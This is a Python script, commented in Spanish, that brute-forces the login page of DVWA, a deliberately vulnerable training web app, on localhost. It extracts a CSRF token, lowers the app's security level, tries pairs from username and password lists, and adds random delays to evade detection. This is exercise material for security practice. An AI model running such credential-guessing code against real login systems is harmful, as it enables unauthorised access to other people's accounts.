import requests
from bs4 import BeautifulSoup
import time
import random

# =================================================================
# CONFIGURACIÓN Y VARIABLES GLOBALES
# =================================================================
DVWA_URL = "http://localhost:90"
LOGIN_URL = f"{DVWA_URL}/login.php"
BRUTE_URL = f"{DVWA_URL}/vulnerabilities/brute/"

# Credenciales de acceso a DVWA para obtener la cookie de sesión
DVWA_USER = "admin"
DVWA_PASS = "password"

# Listas de usuarios y contraseñas para el ataque de fuerza bruta
USERS = ["admin", "gordonb", "1337", "pablo", "smithy"]
PASSWORDS = ["password", "abc123", "charley", "letmein", "sniper"]

# =================================================================
# FUNCIONES
# =================================================================

def login_to_dvwa():
    """
    Inicia sesión en DVWA y devuelve la sesión.
    """
    # Inicia sesión en DVWA y devuelve la sesión
    session = requests.Session()
    response = session.get(LOGIN_URL)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Extracción del user_token (CSRF)
    csrf_token = soup.find('input', {'name': 'user_token'}).get('value')
    
    login_data = {
        'username': DVWA_USER,
        'password': DVWA_PASS,
        'Login': 'Login',
        'user_token': csrf_token
    }
    
    session.post(LOGIN_URL, data=login_data)
    return session

# ---

def brute_force_attack(session):
    """
    Realiza el ataque de fuerza bruta.
    """
    # Realiza el ataque de fuerza bruta
    
    # Intenta configurar la seguridad a nivel bajo (GET)
    session.get(f"{DVWA_URL}/security.php?security=low&seclev_submit=Submit")
    
    valid_credentials = []
    
    for user in USERS:
        for password in PASSWORDS:
            try:
                # Parámetros para la petición GET (típico en DVWA low)
                params = {
                    'username': user,
                    'password': password,
                    'Login': 'Login'
                }
                
                # Petición GET para el ataque
                response = session.get(BRUTE_URL, params=params)
                
                # Criterio de éxito
                if "Welcome to the password protected area" in response.text:
                    credential = f"{user}:{password}"
                    valid_credentials.append(credential)
                
                # Pausa
                time.sleep(random.uniform(0.3, 1.5))
                
            except Exception as e:
                # El 'continue' hace que salte la excepción y siga con el siguiente intento
                continue
                
    return valid_credentials

# =================================================================
# BLOQUE DE EJECUCIÓN PRINCIPAL
# =================================================================

if __name__ == "__main__":
    
    # 1. Obtener la sesión de DVWA
    dvwa_session = login_to_dvwa()
    
    if dvwa_session:
        # 2. Ejecutar el ataque
        found_credentials = brute_force_attack(dvwa_session)
        
        # 3. Imprimir resultados
        if found_credentials:
            print("\nCREDENCIALES VÁLIDAS ENCONTRADAS EN DVWA:")
            print("========================================")
            for cred in found_credentials:
                print(f"{cred}")
            print("========================================")
        else:
            print("\nNo se encontraron credenciales válidas en DVWA")